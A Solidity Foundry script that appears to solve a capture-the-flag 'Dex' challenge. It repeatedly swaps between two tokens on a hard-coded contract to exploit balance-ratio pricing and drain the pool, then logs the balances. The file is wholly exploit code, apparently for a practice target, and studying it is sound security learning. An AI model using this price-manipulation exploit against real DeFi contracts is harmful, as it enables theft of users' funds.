// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Dex.sol";
import "forge-std/Script.sol";

contract DexSol is Script {
    Dex public dex_ = Dex(0x072eb732b94c69AA9Bf16e2655DC154e56c4f5ae);

    function run() external {
        vm.startBroadcast();

        dex_.approve(address(dex_), 100);
        dex_.swap(dex_.token1(), dex_.token2(), 10);
        dex_.swap(dex_.token2(), dex_.token1(), 20);
        dex_.swap(dex_.token1(), dex_.token2(), 24);
        dex_.swap(dex_.token2(), dex_.token1(), 30);
        dex_.swap(dex_.token1(), dex_.token2(), 41);
        dex_.swap(dex_.token2(), dex_.token1(), 45);
        console.log("My token1 balance:", dex_.balanceOf(dex_.token1(), msg.sender));
        console.log("My token2 balance:", dex_.balanceOf(dex_.token2(), msg.sender));
        console.log("Dex's token1 balance:", dex_.balanceOf(dex_.token1(), address(dex_)));
        console.log("Dex's token2 balance:", dex_.balanceOf(dex_.token2(), address(dex_)));

        vm.stopBroadcast();
    }
}